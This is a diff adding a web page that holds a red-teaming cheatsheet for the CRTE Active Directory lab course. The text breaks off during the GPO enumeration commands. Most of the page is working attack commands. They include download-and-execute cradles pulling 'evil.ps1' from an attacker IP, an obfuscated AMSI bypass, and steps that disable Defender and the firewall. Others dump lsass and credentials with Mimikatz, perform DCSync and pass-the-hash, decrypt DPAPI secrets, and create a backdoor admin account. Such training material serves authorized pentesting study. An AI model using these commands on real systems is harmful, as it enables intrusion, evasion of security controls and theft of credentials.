@@ -1,0 +1,1429 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Mani Bharathi</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="img/favicon.png" rel="icon">
+  <link href="img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="vendor/aos/aos.css" rel="stylesheet">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="css/style.css" rel="stylesheet">
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+
+  <!-- ======= Header ======= -->
+ <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+      
+        <h1 class="text-light"><a href="index-2.html">
+
+          <br>乂匚ㄖᗪ乇96</a>
+        </a></h1>
+        <div class="social-links mt-3 text-center">
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="index-2.html"   class="nav-link scrollto active"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li><a href="resume.html"  class="nav-link scrollto"><i class="bi bi-file-earmark-text navicon"></i>Resume</a></li>
+          <li><a href="portfolio.html" class="nav-link scrollto"><i class="bi bi-images navicon navicon"></i><span>Portfolio</span></a></li>
+          <li><a href="cheatsheets.html" class="nav-link scrollto"><i class="bi bi-shield-check"></i>Cheatsheets</a></li>
+          <li><a href="Resourses.html" class="nav-link scrollto"><i class="bi bi-router"></i>Start Resources</a></li>
+          <li><a href="https://buymeacoffee.com/xcode96" target="_blank" class="nav-link scrollto"><i class="bi bi-heart navicon"></i>Buy Me a Coffee</a></li> 
+
+  
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Red Teaming Cheatsheet</h2>
+          <ol>
+            <li><a href="index-2.html">Home</a></li>
+            <li>Red Teaming Cheatsheet</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <!-- ======= Disclaimer Alert ======= -->
+            <div class="alert alert-danger alert-dismissible fade show" role="alert" data-aos="fade-right">
+              <strong>Disclaimer:</strong> This cheatsheet is provided for educational and authorized security testing
+              purposes only. All techniques, tools, and methods described herein must be used only in environments
+              <strong>you have explicit permission to perform security assessments</strong>. The author(s) of this
+              cheatsheet are not responsible for any misuse or damage resulting from the application of this material.
+              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
+            <div class="cheatsheet-content">
+<h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="Certified_Read_Team_Expert_CRTE__Cheatsheet_0"></a>Certified Read Team Expert (CRTE) - Cheatsheet</h1>
+<p class="has-line-data" data-line-start="2" data-line-end="3"><strong>Name</strong> : <strong>CRTE - Active Directory Command Cheat Sheet (Powershell)</strong></p>
+<p class="has-line-data" data-line-start="4" data-line-end="5"><strong>Course Link</strong> : <a href="https://www.alteredsecurity.com/redteamlab">https://www.alteredsecurity.com/redteamlab</a></p>
+<p class="has-line-data" data-line-start="6" data-line-end="7"><strong>Last Updated</strong> : 13 Feb 2023</p>
+<p class="has-line-data" data-line-start="8" data-line-end="9"><strong>Disclaimer</strong> : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.</p>
+<h4 class="code-line" data-line-start=10 data-line-end=11 ><a id="Basic_Operations_10"></a>Basic Operations</h4>
+<pre><code class="has-line-data" data-line-start="13" data-line-end="35" class="language-powershell"><span class="hljs-comment"># Loading powerview locally</span>
+ps&gt; . C:\AD\Tools\PowerView.ps1
+
+<span class="hljs-comment"># Loading ActiveDirectory Module (Also works in Constrained Language Mode)</span>
+Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+
+<span class="hljs-comment"># Loading tools remotely using download and execute cradle</span>
+ps&gt; iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'https://webserver/payload.ps1'</span>)
+ps&gt; iex (iwr <span class="hljs-string">'http://192.168.230.1/evil.ps1'</span> -UseBasicParsing)
+
+<span class="hljs-comment"># File Download using windows binary</span>
+bitsadmin /transfer WindowsUpdates /priority normal http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>/Loader.exe C:\\User\\Public\\Loader.exe
+
+<span class="hljs-comment"># File Transfer using shared drive</span>
+echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
+
+<span class="hljs-comment"># Base 64 encode and decode</span>
+certutil -decode foo.b64 foo.exe
+certutil -encode foo.exe foo.b64
+
+</code></pre>
+<h4 class="code-line" data-line-start=37 data-line-end=38 ><a id="Bypassing_Endpoint_Security_Applocker_and_Powershell_Logging_37"></a>Bypassing Endpoint Security, Applocker and Powershell Logging</h4>
+<pre><code class="has-line-data" data-line-start="40" data-line-end="100" class="language-powershell"><span class="hljs-number">1</span>. Powershell Logging
+<span class="hljs-comment"># Use Invisi-Shell to bypass powershell logging (has inbuild AMSI evasion)</span>
+<span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Invisi-Shell may interfere with some process like Saftelykatz, use Loader.exe for such cases</span>
+
+<span class="hljs-comment"># With Admin Rights</span>
+C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
+<span class="hljs-comment"># Without Admin Rights (modifies registry entries, and is recommended method)</span>
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+<span class="hljs-number">2</span>. AV Evasion
+
+<span class="hljs-comment"># Disable Windows Defender &amp; AMSI bypass script</span>
+Get-MPPreference
+Set-MPPreference -DisableRealTimeMonitoring <span class="hljs-variable">$true</span>
+Set-MpPreference -DisableIOAVProtection <span class="hljs-variable">$true</span>
+<span class="hljs-string">"C:\Program Files\Windows Defender\MpCmdRun.exe"</span> -RemoveDefinitions -All
+
+<span class="hljs-comment"># AMSI Bypass</span>
+S`eT-It`em ( <span class="hljs-string">'V'</span>+<span class="hljs-string">'aR'</span> +  <span class="hljs-string">'IA'</span> + (<span class="hljs-string">'blE:1'</span>+<span class="hljs-string">'q2'</span>)  + (<span class="hljs-string">'uZ'</span>+<span class="hljs-string">'x'</span>)  ) ( [TYpE](  <span class="hljs-string">"{1}{0}"</span>-F<span class="hljs-string">'F'</span>,<span class="hljs-string">'rE'</span>  ) )  ;    (    Get-varI`A`BLE  ( (<span class="hljs-string">'1Q'</span>+<span class="hljs-string">'2U'</span>)  +<span class="hljs-string">'zX'</span>  )  -VaL  ).<span class="hljs-string">"A`ss`Embly"</span>.<span class="hljs-string">"GET`TY`Pe"</span>((  <span class="hljs-string">"{6}{3}{1}{4}{2}{0}{5}"</span> -f(<span class="hljs-string">'Uti'</span>+<span class="hljs-string">'l'</span>),<span class="hljs-string">'A'</span>,(<span class="hljs-string">'Am'</span>+<span class="hljs-string">'si'</span>),(<span class="hljs-string">'.Man'</span>+<span class="hljs-string">'age'</span>+<span class="hljs-string">'men'</span>+<span class="hljs-string">'t.'</span>),(<span class="hljs-string">'u'</span>+<span class="hljs-string">'to'</span>+<span class="hljs-string">'mation.'</span>),<span class="hljs-string">'s'</span>,(<span class="hljs-string">'Syst'</span>+<span class="hljs-string">'em'</span>)  ) ).<span class="hljs-string">"g`etf`iElD"</span>(  ( <span class="hljs-string">"{0}{2}{1}"</span> -f(<span class="hljs-string">'a'</span>+<span class="hljs-string">'msi'</span>),<span class="hljs-string">'d'</span>,(<span class="hljs-string">'I'</span>+<span class="hljs-string">'nitF'</span>+<span class="hljs-string">'aile'</span>)  ),(  <span class="hljs-string">"{2}{4}{0}{1}{3}"</span> -f (<span class="hljs-string">'S'</span>+<span class="hljs-string">'tat'</span>),<span class="hljs-string">'i'</span>,(<span class="hljs-string">'Non'</span>+<span class="hljs-string">'Publ'</span>+<span class="hljs-string">'i'</span>),<span class="hljs-string">'c'</span>,<span class="hljs-string">'c,'</span>  )).<span class="hljs-string">"sE`T`VaLUE"</span>(  ${n`ULl},${t`RuE} )
+
+<span class="hljs-comment"># Use AMSI Trigger and DefenderCheck</span>
+cmd&gt; AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke\PowerShellTcp_Detected.ps1
+cmd&gt; DefenderCheck.exe PowerUp.ps1
+
+<span class="hljs-comment"># Bypass AMSI and ETW based detection by loading the binary using loader utility</span>
+C:\Users\Public\Loader.exe -path http://<span class="hljs-number">192.168</span>.<span class="hljs-number">100</span>.X/SafetyKatz.exe
+C:\Users\Public\AssemblyLoad.exe http://<span class="hljs-number">192.168</span>.<span class="hljs-number">100</span>.X/Loader.exe -path http://<span class="hljs-number">192.168</span>.<span class="hljs-number">100</span>.X/SafetyKatz.exe
+
+<span class="hljs-number">3</span>. Applocker &amp; WDAC Bypas
+
+<span class="hljs-comment"># Check if Powershell is running in Constrained Language Mode (It may be because of Applocker or WDAC)</span>
+<span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode
+
+<span class="hljs-comment"># Check applocker policy for Application Whitelisting via Powerview and Registry (reg.exe)</span>
+Get-AppLockerPolicy –Effective
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+<span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">"HKLM:Software\Policies\Microsoft\Windows\SrpV2"</span>
+<span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">"HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"</span>
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+
+<span class="hljs-comment"># Identify the GPO Policy responsible Applocker</span>
+Get-DomainGPO -Domain us.techcorp.local | ? { <span class="hljs-variable">$_</span>.DisplayName <span class="hljs-operator">-like</span> <span class="hljs-string">"*PAW*"</span> } | select displayname, gpcfilesyspath
+
+<span class="hljs-comment"># Download the GPO Registry Policy file from sysvol share on AD to view applocker policy details</span>
+type <span class="hljs-string">"\\us.techcorp.local\SysVol\us.techcorp.local\Policies\{AFC6881A-5AB6-41D0-91C6-F2390899F102}\Machine\Registry.pol"</span>
+
+<span class="hljs-comment"># Based on policy we need to identify the bypass technique for Applocker (like Whitelisted path)</span>
+<span class="hljs-built_in">Get-Acl</span> C:\Windows\Tasks | fl
+
+<span class="hljs-comment"># Check Windows Device Guard (WDAC) enforcement policy</span>
+wmi
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+
+<span class="hljs-comment"># Bypass for WDAC using rundll32.exe and comsvcs.dll to dump the lsass process</span>
+tasklist /FI <span class="hljs-string">"IMAGENAME eq lsass.exe"</span>
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <span class="hljs-number">708</span> C:\Users\Public\lsass.dmp full
+echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
+Invoke-Mimikatz -Command <span class="hljs-string">"sekurlsa::minidump C:\AD\Tools\lsass.DMP"</span>
+
+</code></pre>
+<h4 class="code-line" data-line-start=102 data-line-end=103 ><a id="Lateral_Movement_102"></a>Lateral Movement</h4>
+<pre><code class="has-line-data" data-line-start="105" data-line-end="152" class="language-powershell"><span class="hljs-comment"># Check for access on other computers using current users session</span>
+Find-LocalAdminAccess -Verbose
+Find-WMILocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess.ps1
+cme smb &lt;COMPUTERLIST&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -H &lt;NTLM HASH&gt;
+cme smb &lt;COMPUTERNAME&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -H &lt;NTLM HASH&gt; -X &lt;COMMAND&gt;
+
+<span class="hljs-comment"># Use WMI for remote session</span>
+<span class="hljs-built_in">Get-WmiObject</span> -Class win32_operatingsystem -ComputerName us-dc.us.techcorp.local
+
+<span class="hljs-comment"># Create PS Session </span>
+<span class="hljs-variable">$usmgmt</span> = New-PSSession -ComputerName us-mgmt
+Enter-PSSession <span class="hljs-variable">$usmgmt</span>
+
+<span class="hljs-variable">$passwd</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">'t7HoBF+m]ctv.]'</span> -AsPlainText -Force
+<span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">"us-mailmgmt\administrator"</span>, <span class="hljs-variable">$passwd</span>)
+<span class="hljs-variable">$mailmgmt</span> = New-PSSession -ComputerName us-mailmgmt -Credential <span class="hljs-variable">$creds</span>
+Enter-PSSession <span class="hljs-variable">$mailmgmt</span>
+
+<span class="hljs-comment"># Invoke Command using Powershell Remoting</span>
+Invoke-Command -Scriptblock {<span class="hljs-built_in">Get-Process</span>} -Session <span class="hljs-variable">$usmgmt</span>
+Invoke-Command -Scriptblock {<span class="hljs-built_in">Get-Process</span>} -ComputerName (<span class="hljs-built_in">Get-Content</span> &lt;list-of-server&gt;)
+Invoke-Command -FilePath C:\scripts\Get-PassHases.ps1 -ComputerName (<span class="hljs-built_in">Get-Content</span> &lt;list-of-server&gt;)
+Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session <span class="hljs-variable">$mailmgmt</span>
+Invoke-Command -Scriptblock ${<span class="hljs-keyword">function</span>:Get-PassHashes} -ComputerName (<span class="hljs-built_in">Get-Content</span> &lt;list-of-server&gt;)
+Invoke-Command -Scriptblock ${<span class="hljs-keyword">function</span>:Get-PassHashes} -ComputerName (<span class="hljs-built_in">Get-Content</span> &lt;list-of-server&gt;) -ArgumentList
+
+<span class="hljs-comment"># Use winrs for ps remoting without logging</span>
+winrs -remote:server1 -u:server1\administrator -p:Pass@<span class="hljs-number">1234</span> hostname
+winrs -remote:US-MAILMGMT -u:US-MAILMGMT\administrator -p:<span class="hljs-string">';jv-2@6e#m]!8O'</span> cmd.exe
+
+<span class="hljs-comment"># Runas cmd as another user</span>
+runas /netonly /user:us\serviceaccount  cmd.exe
+
+<span class="hljs-comment"># Manage Firewall Port Access</span>
+netsh advfirewall firewall add rule name=<span class="hljs-string">"Allow Port 8080"</span> protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">8080</span> action=allow
+netsh advfirewall firewall add rule name=<span class="hljs-string">"Allow Port 8081"</span> protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">8081</span> action=allow
+netsh interface portproxy add v4tov4 listenport=<span class="hljs-number">8080</span> listenaddress=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> connectport=<span class="hljs-number">80</span> connectaddress=<span class="hljs-number">192.168</span>.<span class="hljs-number">100</span>.X
+
+<span class="hljs-comment"># disable firewall</span>
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+powershell.exe -c <span class="hljs-string">'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'</span>
+
+<span class="hljs-comment"># Add user to local admin and RDP group and enable RDP on firewall</span>
+net user &lt;USERNAME&gt; &lt;PASSWORD&gt; /add /Y  &amp;&amp; net localgroup administrators &lt;USERNAME&gt; /add &amp;&amp; net localgroup <span class="hljs-string">"Remote Desktop Users"</span> &lt;USERNAME&gt; /add &amp;&amp; reg add <span class="hljs-string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">0</span> /f &amp;&amp; netsh advfirewall firewall set rule group=<span class="hljs-string">"remote desktop"</span> new enable=Yes
+
+</code></pre>
+<h4 class="code-line" data-line-start=153 data-line-end=154 ><a id="Lateral_Movement__Credentials_Harvesting_153"></a>Lateral Movement - Credentials Harvesting</h4>
+<pre><code class="has-line-data" data-line-start="156" data-line-end="197" class="language-powershell"><span class="hljs-comment"># Check if lsass.exe is running as protected process</span>
+<span class="hljs-built_in">Get-ItemProperty</span> -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name <span class="hljs-string">"RunAsPPL"</span> 
+
+<span class="hljs-comment">## Dumping Credentials</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"sekurlsa::ekeys"'</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"sekurlsa::logonpassword"'</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::lsa /patch"'</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::sam"'</span>
+
+<span class="hljs-comment"># Dump Secrets stored in windows vault</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"vault::list"'</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"vault::cred /patch"'</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"sekurlsa::minidump lsass.dmp"'</span>
+
+<span class="hljs-comment"># Other Mimikatz based utility for duping lsass.exe</span>
+SafetyKatz.exe <span class="hljs-string">"sekurlsa::ekeys"</span>
+SharpKatz.exe --Command ekeys
+rundll32.exe C:\Dumpert\Outflank\Dumpert.dll,Dump
+pypykatz.exe live lsa
+
+tasklist /FI <span class="hljs-string">"IMAGENAME eq lsass.exe"</span> 
+rundll32.exe C:\windows\System32\comsvcs.dll,MiniDump &lt;lsass_process_ID&gt; C:\Users\Public\lsass.dmp full
+
+.\mimikatz.exe
+mimikatz <span class="hljs-comment"># sekurlsa::minidump c:\Ad\Tools\lsass.dmp</span>
+mimikatz <span class="hljs-comment"># privilege::debug</span>
+mimikatz <span class="hljs-comment"># sekurlsa::keys</span>
+mimikatz <span class="hljs-comment"># exit</span>
+
+<span class="hljs-comment"># Lateral Movement - OverPass The Hash</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:aes /run:powershell.exe"'</span>
+SafetyKatz.exe <span class="hljs-string">"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:aes /run:powershell.exe"</span> <span class="hljs-string">"exit"</span>
+
+<span class="hljs-comment"># Generate TGT and inject in current session for double hopping (no admin rights for 1st command)</span>
+Rubeus.exe asktgt /user:administrator /rc4:ntlmHash /ptt
+Rubeus.exe asktgt /user:administrator /aes256:&lt;key&gt; /opsec /createnetonly:c:\Windows\System32\cmd.exe /show /ptt
+
+<span class="hljs-comment"># DCSync </span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::dcsync /user:us\krbtgt"'</span>
+SafetyKatz.exe <span class="hljs-string">"lsadump::dcsync /user:us\krbtgt"</span> <span class="hljs-string">"exit"</span>
+</code></pre>
+<h4 class="code-line" data-line-start=198 data-line-end=199 ><a id="Post_Exploitation_198"></a>Post Exploitation</h4>
+<pre><code class="has-line-data" data-line-start="201" data-line-end="280" class="language-powershell"><span class="hljs-comment">## Limit this command if there are too many files ;)</span>
+tree /f /a C:\Users
+
+<span class="hljs-comment"># Web.config</span>
+C:\inetpub\www\*\web.config
+
+<span class="hljs-comment"># Unattend files</span>
+C:\Windows\Panther\Unattend.xml
+
+<span class="hljs-comment"># RDP config files</span>
+C:\ProgramData\Configs\
+
+<span class="hljs-comment"># Powershell scripts/config files</span>
+C:\Program Files\Windows PowerShell\
+
+<span class="hljs-comment"># PuTTy config</span>
+C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty
+
+<span class="hljs-comment"># FileZilla creds</span>
+C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml
+
+<span class="hljs-comment"># Jenkins creds (also check out the Windows vault, see above)</span>
+C:\Program Files\Jenkins\credentials.xml
+
+<span class="hljs-comment"># WLAN profiles</span>
+C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml
+
+<span class="hljs-comment"># TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)</span>
+<span class="hljs-built_in">Get-ItemProperty</span> -Path HKLM:\Software\TightVNC\Server -Name <span class="hljs-string">"Password"</span> | select -ExpandProperty Password
+
+<span class="hljs-comment"># Look for SAM file</span>
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\Windows\Repair\* -include *.SAM*,*.SYSTEM* -force -Recurse 
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\Windows\System32\config\RegBack\*  -include *.SAM*,*.SYSTEM* -force -Recurse
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\* -include *.SAM*,*.SYSTEM* -force -Recurse 
+
+<span class="hljs-comment"># Check Registry for password</span>
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+<span class="hljs-comment"># Check for unattend and sysgrep files</span>
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\* -Recurse -Include *Unattend.xml*
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\Windows\Panther\* -Recurse -Include *Unattend.xml* 
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\Windows\system32\* -Recurse -Include *sysgrep.xml*, *sysgrep.inf* 
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\* -Recurse -Include *Unattend.xml*, *sysgrep.xml*, *sysgrep.inf* 
+
+<span class="hljs-comment"># Look for powershell history files</span>
+<span class="hljs-built_in">Get-Childitem</span> -Path C:\Users\* -Force -Include *ConsoleHost_history* -Recurse -ErrorAction SilentlyContinue
+
+<span class="hljs-comment"># Hardcoded Password in scripts</span>
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">"password"</span>| <span class="hljs-built_in">Export-Csv</span> C:\Scripts\Report.csv -NoTypeInformation
+<span class="hljs-built_in">Get-ChildItem</span> -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">"creds"</span>| <span class="hljs-built_in">Export-Csv</span> C:\Scripts\Report.csv -NoTypeInformation
+
+<span class="hljs-comment"># Azure token</span>
+<span class="hljs-built_in">Get-ChildItem</span> -path <span class="hljs-string">"C:\Users\*"</span> -Recurse -Include *accessTokens.json*, *TokenCache.dat*, *AzureRmContext.json*
+
+<span class="hljs-comment"># Dump Password Vault</span>
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+<span class="hljs-variable">$vault</span> = <span class="hljs-built_in">New-Object</span> Windows.Security.Credentials.PasswordVault
+<span class="hljs-variable">$vault</span>.RetrieveAll() | % { <span class="hljs-variable">$_</span>.RetrievePassword();<span class="hljs-variable">$_</span> }
+
+<span class="hljs-comment"># Find the IDs of protected secrets for a specific user</span>
+dir C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials
+
+<span class="hljs-comment"># Get information, including the used master key ID, from a specific secret (take the path from above)</span>
+dpapi::cred /<span class="hljs-keyword">in</span>:C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials\<span class="hljs-number">1</span>EF01CC92C17C670AC9E57B53C9134F3
+
+<span class="hljs-comment"># IF YOU ARE PRIVILEGED</span>
+<span class="hljs-comment"># Dump all master keys from the current system</span>
+sekurlsa::dpapi
+
+<span class="hljs-comment"># IF YOU ARE NOT PRIVILEGED (session as target user required)</span>
+<span class="hljs-comment"># Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)</span>
+dpapi::masterkey /rpc /<span class="hljs-keyword">in</span>:C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Protect\S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3865823697</span>-<span class="hljs-number">1816233505</span>-<span class="hljs-number">1834004910</span>-<span class="hljs-number">1124</span>\dd89dddf-<span class="hljs-number">946</span>b-<span class="hljs-number">4</span>a80-<span class="hljs-number">9</span>fd3-<span class="hljs-number">7</span>f03ebd41ff4
+
+<span class="hljs-comment"># Decrypt the secret using the retrieved master key</span>
+<span class="hljs-comment"># Alternatively, leave out /masterkey and add /unprotect to decrypt the secret using the cached master key (see above for caveats)</span>
+dpapi::cred /<span class="hljs-keyword">in</span>:C:\Users\[USERNAME]]\AppData\Local\Microsoft\Credentials\<span class="hljs-number">1</span>EF01CC92C17C670AC9E57B53C9134F3 /masterkey:<span class="hljs-number">91721</span>d8b1ec[...]e0f02c3e44deece5f318ad
+
+</code></pre>
+<h2 class="code-line" data-line-start=281 data-line-end=282 ><a id="Domain_Enumeration_281"></a>Domain Enumeration</h2>
+<h4 class="code-line" data-line-start=283 data-line-end=284 ><a id="Domian_Details_283"></a>Domian Details</h4>
+<pre><code class="has-line-data" data-line-start="286" data-line-end="297" class="language-powershell"><span class="hljs-comment"># Get domain details  </span>
+Get-Domain
+Get-Domain -Domain techcorp.local
+Get-DomainSID
+
+Get-DomainPolicyData
+(Get-DomainPolicyData).systemaccess
+(Get-DomainPolicyData -domain techcorp.local).systemaccess
+
+Get-DomainController -Domain techcorp.local
+</code></pre>
+<h4 class="code-line" data-line-start=298 data-line-end=299 ><a id="Domian_User_Group_and_Computer_Objects_298"></a>Domian User, Group and Computer Objects</h4>
+<pre><code class="has-line-data" data-line-start="301" data-line-end="347" class="language-powershell"><span class="hljs-comment"># Domains Users</span>
+Get-DomainUser -Identity studentuser1 -Properties *
+Get-DomainUser -LDAPFilter <span class="hljs-string">"Description=*"</span> | Select Name,Description
+Get-DomainUser -TrustedToAuth | Select Name, msds-allowedtodelegateto
+Get-DomainUser -SPN | Select Name, ServicePrincipalName
+
+<span class="hljs-comment"># Domain Groups</span>
+Get-DomainGroup -Domain techcorp.local
+Get-DomainGroupMember -Identity <span class="hljs-string">"Domain Admins"</span> -Recurse
+
+<span class="hljs-comment"># Find group membership of a user</span>
+Get-DomainGroup -UserName studentuser1
+Get-DomainGroup -UserName <span class="hljs-string">'studentuser41'</span> | select distinguishedname
+net user student41 /domain
+whoami /groups
+
+<span class="hljs-comment"># Script to find group membership of user recursively </span>
+<span class="hljs-keyword">function</span> Get-ADPrincipalGroupMembershipRecursive (<span class="hljs-variable">$SamAccountName</span>) { <span class="hljs-variable">$groups</span> = @(Get-ADPrincipalGroupMembership -Identity <span class="hljs-variable">$SamAccountName</span> | select -ExpandProperty distinguishedname) <span class="hljs-variable">$groups</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$groups</span>.count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) { <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$group</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$groups</span>) { Get-ADPrincipalGroupMembershipRecursive <span class="hljs-variable">$group</span> } } };
+Get-ADPrincipalGroupMembershipRecursive <span class="hljs-string">'studentuserx'</span>
+
+<span class="hljs-comment"># Find local group on machine (admin required for non-dc machines)</span>
+Get-NetLocalGroup -ComputerName us-dc
+
+<span class="hljs-comment"># Get members of local groups idenitied in prvious steps on a machine</span>
+Get-NetLocalGroupMember -ComputerName us-dc
+Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators
+
+<span class="hljs-comment"># Domain Computers</span>
+Get-DomainComputer | select Name
+Get-DomainComputer -Unconstrained | select Name
+Get-DomainComputer -TrustedToAuth | select Name, msds-allowedtodelegateto
+
+<span class="hljs-comment"># Interesting share</span>
+Get-DomainFileServer
+Get-DomainDFSShare
+Get-NetShare
+Find-DomainShare
+Find-InterestingDomainShareFile
+<span class="hljs-built_in">Get-Childitem</span> -Path C:\ -Force -Include &lt;FILENAME OR WORD TO SEARCH&gt; -Recurse -ErrorAction SilentlyContinue
+
+<span class="hljs-comment"># Find Foreign Group Member (ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group, and not by adding user as pricipal owner via ACL)</span>
+Find-ForeignGroup -Verbose
+Find-ForeignUser -Verbose
+Get-DomainForeignGroupMember
+Get-DomainForeignGroupMember -Domain &lt;TARGET DOMAIN FQDN&gt;
+</code></pre>
+<h4 class="code-line" data-line-start=348 data-line-end=349 ><a id="Domain_GPO__OU_Enumeration_348"></a>Domain GPO &amp; OU Enumeration</h4>
+<pre><code class="has-line-data" data-line-start="351" data-line-end="386" class="language-powershell"><span class="hljs-comment"># GPO Enumeration</span>
+Get-DomainGPO
+
+<span class="hljs-comment"># Enumerate GPOs appliable to a given machine </span>
+Get-DomainGPO -ComputerIdentity student41.us.techcorp.local | select displayname
+
+<span class="hljs-comment"># Find the GPO of RestrictedGroup type for local group membership</span>
+Get-DomainGPOLocalGroup
+
+<span class="hljs-comment"># Find the users which are in local group of a machine using GPO</span>
+Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity us-mgmt
+
